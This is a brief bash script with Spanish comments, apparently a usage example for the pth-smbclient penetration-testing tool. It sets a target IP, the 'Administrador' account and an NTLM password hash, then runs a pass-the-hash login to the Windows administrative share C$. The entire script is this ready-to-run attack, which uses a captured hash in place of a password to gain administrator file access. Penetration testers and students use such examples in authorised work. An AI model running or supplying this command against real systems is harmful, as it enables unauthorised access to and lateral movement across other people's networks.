#!/bin/bash
# pth-smbclient-example.sh
# Ejemplo de uso de pth-smbclient.

IP="192.168.1.10"
USER="Administrador"
HASH="32ED87BDB5FDC5E9CBA88547376818D4"

pth-smbclient //$IP/C$ -U $USER%$HASH